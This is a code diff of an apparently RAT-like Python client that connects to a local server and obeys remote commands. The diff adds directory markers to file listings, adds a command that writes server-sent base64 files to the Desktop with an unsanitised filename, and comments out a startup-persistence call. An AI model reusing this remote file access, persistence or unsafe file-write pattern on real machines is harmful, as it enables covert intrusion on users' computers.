@@ -6,6 +6,7 @@ import time
 import platform
 import subprocess
 import threading
+import base64
 
 HOST = "127.0.0.1"
 PORT = 5000
@@ -54,8 +55,17 @@ def handle_command(cmd):
                 path = os.path.join(os.path.expanduser("~"), "Desktop")
 
             if os.path.isdir(path):
-                files = os.listdir(path)
-                return "FILES|" + path + "|" + "||".join(files)
+                items = []
+
+                for name in os.listdir(path):
+                    full = os.path.join(path, name)
+
+                    if os.path.isdir(full):
+                        items.append("[DIR]" + name)
+                    else:
+                        items.append(name)
+
+                return "FILES|" + path + "|" + "||".join(items)
             else:
                 return "FILES|" + path + "|"
 
@@ -75,6 +85,22 @@ def handle_command(cmd):
 
         except:
             return f"FILE_CONTENT|ERROR|Ошибка чтения"
+
+    elif cmd.startswith("SEND_FILE"):
+        try:
+            _, filename, data = cmd.split("|", 2)
+
+            file_bytes = base64.b64decode(data)
+
+            save_path = os.path.join(os.path.expanduser("~"), "Desktop", filename)
+
+            with open(save_path, "wb") as f:
+                f.write(file_bytes)
+
+            return f"FILE_RECEIVED|{filename}"
+
+        except:
+            pass
 
 
 def receiver_loop(s):
@@ -119,5 +145,5 @@ def start_client():
             time.sleep(5)
 
 
-add_to_startup()
+#add_to_startup()
 start_client()
